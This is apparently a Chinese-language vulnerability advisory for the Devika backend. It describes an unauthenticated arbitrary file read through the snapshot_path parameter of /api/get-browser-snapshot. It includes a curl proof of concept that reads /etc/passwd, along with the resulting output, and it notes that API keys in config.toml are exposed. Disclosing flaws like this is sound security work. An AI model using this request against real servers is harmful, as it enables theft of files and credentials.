# Devika：未认证任意文件读取（/api/get-browser-snapshot）

## 描述

Devika 后端默认以 `0.0.0.0:1337` 启动且全部 API 无认证。`GET /api/get-browser-snapshot`（devika.py:123-127）把查询参数 `snapshot_path` 原样传给 `send_file`，没有任何路径校验（无前缀约束、无 `..` 拒绝、无规范化检查）。

## 影响

任何能访问 1337 端口的网络客户端（默认绑定 0.0.0.0，局域网内即可）无需任何凭据读取服务器进程可读的任意文件：配置、源码、`config.toml`（内含各 LLM API key）等。

## PoC

```bash
# 前提：devika 已启动（python devika.py，默认 0.0.0.0:1337）
curl "http://127.0.0.1:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd"
```

## 执行结果

```
$ curl "http://127.0.0.1:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[HTTP 200]
```
